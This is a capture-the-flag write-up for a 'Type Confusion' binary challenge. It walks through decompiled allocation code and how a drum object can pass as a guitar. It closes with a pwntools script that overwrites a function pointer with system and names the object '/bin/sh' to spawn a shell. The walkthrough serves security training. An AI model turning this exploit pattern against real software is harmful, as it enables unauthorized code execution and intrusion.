# Type Confusion

## Solution

Upon running this binary, we get the following menu:
```
1. Borrow a guitar
2. Borrow a drum
3. Name your instrument
4. Display your instrument
5. Exit
```
Borrowing a guitar or drum creates an object to go in an instruments list. Naming an instrument let's you provide a name to it. Then, display your instrument prints the name of an instrument of your choice.

Creating a guitar does the following:
```c
0040174f      void* rax_5 = malloc(0x20);
00401773      *(int64_t*)((((int64_t)count) << 3) + &instruments) = rax_5;
0040177b      *(int32_t*)((char*)rax_5 + 0x10) = 0x31337;
0040178d      *(int64_t*)((char*)rax_5 + 0x18) = display_guitar;
```
Creating a drum does the following:
```c
00401818      void* rax_5 = malloc(0x30);
0040183c      *(int64_t*)((((int64_t)count) << 3) + &instruments) = rax_5;
00401844      *(int32_t*)((char*)rax_5 + 0x20) = 0xdeadbeef;
00401856      *(int64_t*)((char*)rax_5 + 0x28) = display_drum;
```
We first notice that a drum provides `16` more bytes to its name than a guitar. After the name, we store an identifier and the address to the function to print the instrument.

Upon further inspection, in order to determine if an instrument is a guitar or a drum, the binary checks if the third quadword is equal to `0x31337`. Thus, if we make a drum and set the third quadword as `0x31337`, the program will think it is a guitar. In this case, when display is called, it will jump to the fourth quadword, which we control!

Thus, if we set the display function to be `system` and name the instrument `/bin/sh`, we can get a shell. The following python accomplishes this:
```python
p.sendlineafter(b">>>", b"2")
p.sendlineafter(b">>>", b"3")
p.sendlineafter(b">>>", b"0")
p.sendlineafter(b">>>", b"A"*16 + p64(0x31337) + p64(system))
p.sendlineafter(b">>>", b"3")
p.sendlineafter(b">>>", b"0")
p.sendlineafter(b">>>", b"/bin/sh")
p.sendlineafter(b">>>", b"4")
p.sendlineafter(b">>>", b"0")
```